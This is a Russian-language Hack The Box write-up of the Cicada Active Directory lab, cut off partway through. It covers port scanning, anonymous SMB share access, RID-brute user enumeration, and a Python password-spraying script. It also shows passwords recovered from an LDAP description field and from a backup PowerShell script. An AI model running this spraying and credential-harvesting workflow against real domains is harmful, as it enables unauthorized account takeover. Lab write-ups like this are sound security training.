### Прохождение виртуальной машины Cicada
#### https://app.hackthebox.com/machines/Cicada
---

По традиции проводим сканирование портов через **nmap**, параметр `-Pn` используем: в этой машине порты 443 и 80 закрыты
```vbnet
# Nmap 7.60 scan initiated Wed Dec 18 05:30:16 2024 as: nmap -Pn -sS -sC -sV -p- -T5 --max-rate 10000 -oN cicada.txt cicada.htb
Nmap scan report for cicada.htb (10.10.11.35)
Host is up (0.065s latency).
Not shown: 65522 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-18 17:39:28Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2024-12-18T17:40:20+00:00; +7h00m03s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2024-12-18T17:40:19+00:00; +7h00m03s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2024-12-18T17:40:20+00:00; +7h00m03s from scanner time.
3269/tcp  open  ssl           Microsoft SChannel TLS
| fingerprint-strings: 
|   TLSSessionReq: 
|     DOWNGRD
|     Q\x8e
|     htb1
|     cicada1
|     CICADA-DC-CA0
|     240822202416Z
|     250822202416Z0
|     CICADA-DC.cicada.htb0
|     \xb0
|     \x14
|     AyHa*
|     k0i0
|_    ldap:///CN
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2024-12-18T17:40:18+00:00; +7h00m03s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
58050/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3269-TCP:V=7.60%I=7%D=12/18%Time=6762A67F%P=x86_64-pc-linux-gnu%r(T
SF:LSSessionReq,66C,"\x16\x03\x03\x06g\x02\0\0M\x03\x03gc\x08\xed\xc0b\x92
SF:\xb9\|\x1e\tZl\x98e\xf5r\x1f\xcd\x07\x85\xa1=\xe8DOWNGRD\x01\x20\x939\0
SF:\0\x96io{\xee\xac\x98\xddhD\xa9\x0b\xac\x03<\xeeJ@\x8fQ\\\x8e\xc6\x12m-
SF:\xe2g\0/\0\0\x05\xff\x01\0\x01\0\x0b\0\x05\xea\0\x05\xe7\0\x05\xe40\x82
SF:\x05\xe00\x82\x04\xc8\xa0\x03\x02\x01\x02\x02\x13\x1e\0\0\0\x03\x98\xdf
SF:\xc4\x05S\x81\x92D\0\x01\0\0\0\x030\r\x06\t\*\x86H\x86\xf7\r\x01\x01\x0
SF:b\x05\x000D1\x130\x11\x06\n\t\x92&\x89\x93\xf2,d\x01\x19\x16\x03htb1\x1
SF:60\x14\x06\n\t\x92&\x89\x93\xf2,d\x01\x19\x16\x06cicada1\x150\x13\x06\x
SF:03U\x04\x03\x13\x0cCICADA-DC-CA0\x1e\x17\r240822202416Z\x17\r2508222024
SF:16Z0\x1f1\x1d0\x1b\x06\x03U\x04\x03\x13\x14CICADA-DC\.cicada\.htb0\x82\
SF:x01\"0\r\x06\t\*\x86H\x86\xf7\r\x01\x01\x01\x05\0\x03\x82\x01\x0f\x000\
SF:x82\x01\n\x02\x82\x01\x01\0\xe6\xadg9\xc9\xd5\x9c\xb9\x13\xc7\xd5\x16\x
SF:c0\xd6\xb6\xaew\xd4\xa0&O%\xfc\x07\x13\xdd!W\x9f\x1bX\xca\x1c\xb6\x13\x
SF:bd\+\x10-P\xee\xbfM\xbe\xa7ob\x1f\xdb\xe7\xa9\x8b\xc8\xcd\(\x85Z\)J\x08
SF:Pq\xb5\xf3\xa9\xca\xf0\x9a\x11\x0b\x9a5\xa2j\xbfz\xae\xcai\?\xa7\r11\xf
SF:4\x8b2\xe3yzc\xc9\xe7!\xed\x0b\xb7\x1a\x9e\xd69\xd6d\x83\xae\xf5\xc1\xc
SF:4\xc5H\x7fm\xc9P\xa8\x1b\x86\xa4\x9cJ\xb7a\xf1\xf8K\xf1r\xa0euc\x1ed\x1
SF:9V~\x0e6\r\xaf\$\xfd\xad\xbb\xb3\xf5\*E\xd7\x8f\xb3\x1d\xaf/F\x14B\)-\x
SF:d0\xda\xef\x8fO/\.\xf1\xa3\\\xb0\xf0\)h0\xcb\\\x14\xac\x15h\x91\xf2\xee
SF:\xd3\x20\xc1NOU\xb1AyHa\*\x14<\x8c\x14w8\x16\x8c\x06\xda\x88\xcc\x80\t\
SF:xd3\xdd\x8b7\+2\xe1n\xaa\xf2%\x85s\xe4\xdb\xe3x\x05\?\x89\xdfoU\xef\xa7
SF:\x99\x89\xda\x94\xad\xa8'\x99\x96w\xa2/\xb0\^\xd1\*\x9d\x0e\x19c\x07\x8
SF:1\x02\x03\x01\0\x01\xa3\x82\x02\xee0\x82\x02\xea0/\x06\t\+\x06\x01\x04\
SF:x01\x827\x14\x02\x04\"\x1e\x20\0D\0o\0m\0a\0i\0n\0C\0o\0n\0t\0r\0o\0l\0
SF:l\0e\0r0\x1d\x06\x03U\x1d%\x04\x160\x14\x06\x08\+\x06\x01\x05\x05\x07\x
SF:03\x02\x06\x08\+\x06\x01\x05\x05\x07\x03\x010\x0e\x06\x03U\x1d\x0f\x01\
SF:x01\xff\x04\x04\x03\x02\x05\xa00x\x06\t\*\x86H\x86\xf7\r\x01\t\x0f\x04k
SF:0i0\x0e\x06\x08\*\x86H\x86\xf7\r\x03\x02\x02\x02\0\x800\x0e\x06\x08\*\x
SF:86H\x86\xf7\r\x03\x04\x02\x02\0\x800\x0b\x06\t`\x86H\x01e\x03\x04\x01\*
SF:0\x0b\x06\t`\x86H\x01e\x03\x04\x01-0\x0b\x06\t`\x86H\x01e\x03\x04\x01\x
SF:020\x0b\x06\t`\x86H\x01e\x03\x04\x01\x050\x07\x06\x05\+\x0e\x03\x02\x07
SF:0\n\x06\x08\*\x86H\x86\xf7\r\x03\x070\x1d\x06\x03U\x1d\x0e\x04\x16\x04\
SF:x14\x069`\xc3{I\xbd\x16W\xc1\xa9\xcf'E,\xf0\xbe\xef\x9d@0\x1f\x06\x03U\
SF:x1d#\x04\x180\x16\x80\x14\x88\x0f\xb8\x0bu\xf8\x1dnDM\xe7\x87\^\x90\xea
SF:\x04\x81\x91<\xe90\x81\xcb\x06\x03U\x1d\x1f\x04\x81\xc30\x81\xc00\x81\x
SF:bd\xa0\x81\xba\xa0\x81\xb7\x86\x81\xb4ldap:///CN");
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m02s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-12-18 12:40:22
|_  start_date: 1600-12-31 19:03:58

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 18 05:40:55 2024 -- 1 IP address (1 host up) scanned in 638.87 seconds
```

Перед тем, как мы начнем поиск уязвимостей, нужно изучить, в чем разница между **SMB (Server Message Block)**, **LDAP (Lightweight Directory Access Protocol)**, и **RPC (Remote Procedure Call)**

Порт **445** (**SMB**) - это протокол, который позволяет компьютерам в сети обмениваться файлами, принтерами и другими ресурсами. Он предоставляет доступ к общим ресурсам, таким как файлы и принтеры, и позволяет удаленно управлять файлами, а также делать их доступными другим устройствам

Также, в сети используется порт **636** и **3268** (**LDAP**), используется для работы с каталогами, содержащими информацию об объектах в сети, такими как пользователи, группы и устройства. Этот протокол предоставляет способы поиска и управления данными в иерархической структуре (например, в **Active Directory**), как внутри локальной сети, так и удаленно. Однако стоит отметить, что **LDAP** уязвим к **Man-in-the-Middle** (**MiTM**) атакам, если данные передаются в открытом виде через порт **389**. Чтобы избежать таких уязвимостей, используется порт **636**, который шифрует все передаваемые данные с помощью **SSL/TLS**

Порт **135** (**RPC**) - это протокол, который позволяет приложениям на одном компьютере вызывать функции или процедуры на другом компьютере в сети. Это основной способ взаимодействия программ в распределенных системах

Порт **88/tcp** используется для протокола **Kerberos** — системы аутентификации, которая широко используется в сетях для безопасной идентификации пользователей. Этот протокол играет ключевую роль в аутентификации как в **LDAP**, **RPC**, так и в **SMB**. В частности, в средах, таких как **Active Directory**, **Kerberos** обеспечивает безопасный обмен учетными данными между клиентами и серверами.

Пока что, этой информации нам достаточно, чтоб начать поиск уязвимостей, начинать мы будем с **SMB** протокола. В данном документации, я буду использовать утилиту **smbclient** для роботы с ним, для начала, давайте узнаем какие существуют шары в сети
```
(netexec-py3.13) Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ smbclient -L //cicada.htb -N
Can't load /etc/samba/smb.conf - run testparm to debug it

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DEV             Disk      
        HR              Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

Таким образом, у нас есть список шаров **SMB** сети, что является важной утечкой информации. Чтобы предотвратить такую утечку, можно ограничить отображение списка общих ресурсов в конфигурации **Samba**, добавив параметр ```hide unreadable = yes``` в файл `/etc/samba/smb.conf`.

Если файл `/etc/samba/smb.conf` неправильно настроен, это может привести к опасным уязвимостям, одной из которых является анонимный доступ к общим ресурсам. Например, если мы попытаемся войти в каждый из шаров без аутентификации, используя параметр `-N`, мы можем обнаружить, что шар **HR** доступен без аутентификации:
```vbnet
smbclient //cicada.htb/HR -N
Can't load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> 
```

Мы видим что у нас есть какой-то файл внутри шара, к которому мы имеем доступ, 
```vbnet
smb: \> ls
  .                                   D        0  Thu Mar 14 14:29:09 2024
  ..                                  D        0  Thu Mar 14 14:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 20:31:48 2024

                4168447 blocks of size 4096. 141480 blocks available
```

Стоит учитывать, что на данный момент мы находимся в **Windows**, поэтому, чтоб скопировать файл в нашу директорию на нашу ОС, нам нужно выполнить следуйщую **Power shell** команду
```vbnet
smb: \> mget *
```

Теперь мы можем посмотреть содержание txt файла
```
Hexada@hexada ~/app/docker_volume/cicada.htb$ cat 'Notice from HR.txt'                                                                                                                     

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*****

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

На основе этого письма, мы можем узнать, что в учетных записях **SMB** сети, у всех по умолчанию стоит пароль `Cicada$M6Corpb*****`, если логично подумать, должен быть какой-то сотрудник, который забыл изменить пароль, если у нас получиться узнать список учётных записей **SMB** сети, возможно, мы сможем подключиться к какой-то из них, для этого мы будем использовать утилиту **NetExec**
```git clone https://github.com/Pennyw0rth/NetExec```

```sudo pacman -S poetry``` либо ```sudo apt install poetry```

```poetry install```

```cd nxc```

```poetry run python netexec.py smb cicada.htb -u abzee -p "" --rid-brute > cicada.txt```
```vbnet
SMB                      10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB                      10.10.11.35     445    CICADA-DC        [+] cicada.htb\abzee: (Guest)
SMB                      10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB                      10.10.11.35     445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB                      10.10.11.35     445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB                      10.10.11.35     445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB                      10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB                      10.10.11.35     445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

Получив список учетных записей, нам нужно каким-то образом узнать, есть ли тут какая-то учетная запись, на которой не был изменен пароль и на которой до сих пор стоит пароль Cicada$M6Corpb*****, можно конечно в ручную делать запрос с этим паролем на каждую учетную запись, но это не профессионально, нужно уметь автоматизировать операции, поэтому я написал скрипт на **python** с использованием **re** для парсинга только имени учетных записей, **subprocess** для выполнения подключения к учетной записи через **SMB**, и немного **os** просто чтоб перейти в директорию с **NetExec**, который будет проводить подключение к учетным записям
```python
import re
import subprocess
import os

with open('cicada.txt', 'r') as file:
    output = file.read()

user_pattern = r"CICADA\\([a-zA-Z0-9._\-\s]+)(?=\s\(\w+\))"
users = re.findall(user_pattern, output)

password = "Cicada$M6Corpb*****"

os.chdir('/home/Hexada/app/pentesting-tools/NetExec/nxc')

for user in users:
    wait = "[ * ]"
    success = "[ + ]"
    fail = "[ - ]"
    unexpected = "[ ? ]"

    print(f"account login to {user} account {wait}")
    
    result = subprocess.run(
        ["poetry", "run", "python", "netexec.py", "smb", "cicada.htb", "-u", user, "-p", password, "--shares"],
        capture_output=True, text=True
    )
    
    success_pattern = r"\[\*\] Enumerated shares"
    failure_pattern = r"\[-\] Error enumerating shares"

    if re.search(success_pattern, result.stdout):
        print(f"successful login to {user} account {success}")
    elif re.search(failure_pattern, result.stdout):
        print(f"failed login to {user} account {fail}")
    else:
        print(f"Unexpected result for {user} {unexpected}")
```

На основе вывода скрипта, мы узнаем что такая учетная запись существует
```
account login to michael.wrightson account [ * ]
successful login to michael.wrightson account [ + ]
```

Давайте попробуем в неё войти, и посмотреть к каким шарам, у нас есть доступ
```vbnet
Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ poetry run python netexec.py smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*****' --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*****
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV                             
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share
```

К сожалению, мы не имеем достаточно прав, чтоб как-то взаимодействовать с этими шарами
```
Hexada@hexada ~/Downloads$ smbclient //cicada.htb/IPC$ -U michael.wrightson                                                                                                         130 ↵  
smb: \> ls
NT_STATUS_NO_SUCH_FILE listing \*
```
```
Hexada@hexada ~/Downloads$ smbclient //cicada.htb/NETLOGON -U michael.wrightson                                                                                                            
do_connect: Connection to CICADA-DC.cicada.htb failed (Error NT_STATUS_UNSUCCESSFUL)
```
```
Hexada@hexada ~/Downloads$ smbclient //cicada.htb/SYSVOL  -U michael.wrightson                                                                                                        1 ↵  
do_connect: Connection to CICADA-DC.cicada.htb failed (Error NT_STATUS_UNSUCCESSFUL)
```

Но мы можем работать через эту учетную запись не только в **SMB**, давайте попробуем войти через неё в **RPC** и **LDAP**

**RPC**
```vbnet
Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ rpcclient -U michael.wrightson cicada.htb                                                                                       1 ↵ main 
Can't load /etc/samba/smb.conf - run testparm to debug it
Password for [WORKGROUP\michael.wrightson]:
rpcclient $>
```

Полазив там, посмотрев права и привилегии, посмотрев информацию о пользователях, и изучив группы, я из всего перечисленого, увидел только одну очень интересуную вещь в `Description`
```vbnet
rpcclient $> queryuser 0x454
        User Name   :   david.orelious
        Full Name   :
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   Just in case I forget my password is aRt$L*****
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Wed, 08 Jan 2025 19:17:06 EET
        Logoff Time              :      Thu, 01 Jan 1970 03:00:00 MSK

        ...
```

Кстати, мы можем тоже самое увидеть в `Description`, в **LDAP**

```vbnet
Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ ldapsearch -H ldap://cicada.htb -D 'michael.wrightson@cicada.htb' -w 'Cicada$M6Corpb*****' -b 'dc=cicada,dc=htb'
```
```vbnet
# David Orelious, Users, cicada.htb
dn: CN=David Orelious,CN=Users,DC=cicada,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: David Orelious
sn: Orelious
description: Just in case I forget my password is aRt$L*****
givenName: David
initials: D
distinguishedName: CN=David Orelious,CN=Users,DC=cicada,DC=htb
instanceType: 4
whenCreated: 20240314121729.0Z
whenChanged: 20250108084925.0Z

...
```

Теперь у нас есть доступ к двум учетным записям, давайте посмотри какие привелегии имеет учетная запись `david.orelious`
```vbnet
Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ poetry run python netexec.py smb cicada.htb -u david.orelious -p 'aRt$L*****' --shares                                    130 ↵ main 
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV             READ            
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share
```

Как мы видим, мы имеем досиуп к шару **DEV**, к которому мы раньше не имели доступ с учетной записи `michael.wrightson`, давайте смотреть что там
```vbnet
Hexada@hexada ~/app/cicada.htb$ smbclient //cicada.htb/DEV -U david.orelious                                                                                                               
Can't load /etc/samba/smb.conf - run testparm to debug it
Password for [WORKGROUP\david.orelious]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 14:31:39 2024
  ..                                  D        0  Thu Mar 14 14:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 20:28:22 2024

                4168447 blocks of size 4096. 110752 blocks available
smb: \> mget *
Get file Backup_script.ps1? y
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (1.5 KiloBytes/sec) (average 1.5 KiloBytes/sec)
```

```vbnet
Hexada@hexada ~/app/cicada.htb$ cat Backup_script.ps1                                                                                                                                      

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```


Это **power shell** скрипт



